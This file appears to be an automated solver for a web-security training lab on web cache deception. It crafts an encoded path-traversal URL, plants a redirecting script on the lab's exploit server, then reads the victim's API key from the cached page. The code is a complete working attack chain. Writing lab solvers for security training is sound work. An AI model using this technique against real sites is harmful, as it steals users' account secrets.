const {
  fetchText,
  getExploitServerUrl,
  labLogin,
  runLab,
  storeExploit,
  submitSolutionAnswer,
} = require('./_common.cjs');

const TITLE = 'Exploiting cache server normalization for web cache deception';
const PATH = '/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization';

function extractApiKey(text) {
  return text.match(/(?:API Key|Your API key is)[:\s]*([a-zA-Z0-9]{20,})/i)?.[1] || '';
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const craftedPath = `/my-account%23%2f%2e%2e%2fresources?wcd=${Date.now()}`;
    await storeExploit(page, exploitUrl, `<script>document.location="${labUrl}${craftedPath}"</script>`, true);
    await page.waitForTimeout(4000);
    await page.context().clearCookies();
    const response = await fetchText(page, labUrl + craftedPath, { maxRedirects: 0 });
    const apiKey = extractApiKey(response.text);
    if (!apiKey) {
      throw new Error('Carlos API key not found in cached response');
    }
    await submitSolutionAnswer(page, apiKey);
  },
});
